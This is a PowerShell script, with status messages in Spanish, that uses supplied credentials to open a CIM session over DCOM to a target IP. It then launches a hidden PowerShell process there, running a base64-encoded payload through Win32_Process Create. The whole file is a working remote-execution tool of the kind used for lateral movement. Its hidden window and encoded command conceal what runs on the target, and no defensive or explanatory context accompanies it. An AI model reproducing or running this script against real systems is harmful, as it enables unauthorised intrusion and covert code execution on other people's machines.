param(
    [string]$Username,
    [string]$Password,
    [string]$TargetIP,
    [string]$B64Command
)

try {
    Write-Host "[*] Creando credenciales para el usuario $Username..." -ForegroundColor Cyan
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword)

    Write-Host "[*] Estableciendo sesión CIM con $TargetIP..." -ForegroundColor Cyan
    $Options = New-CimSessionOption -Protocol DCOM
    $Session = New-CimSession -ComputerName $TargetIP -Credential $Credential -SessionOption $Options

    Write-Host "[*] Enviando payload codificado en base64 para ejecución remota..." -ForegroundColor Cyan
    $CommandLine = "powershell -nop -w hidden -e $B64Command"
    $Args = @{ CommandLine = $CommandLine }

    $Result = Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments $Args

    if ($Result.ProcessId -ne $null) {
        Write-Host "[+] Proceso iniciado remotamente con PID: $($Result.ProcessId)" -ForegroundColor Green
    } else {
        Write-Warning "[-] La ejecución remota no devolvió un PID. Puede que haya fallado."
    }

    Remove-CimSession -CimSession $Session
} catch {
    Write-Error "[-] Error: $_"
}
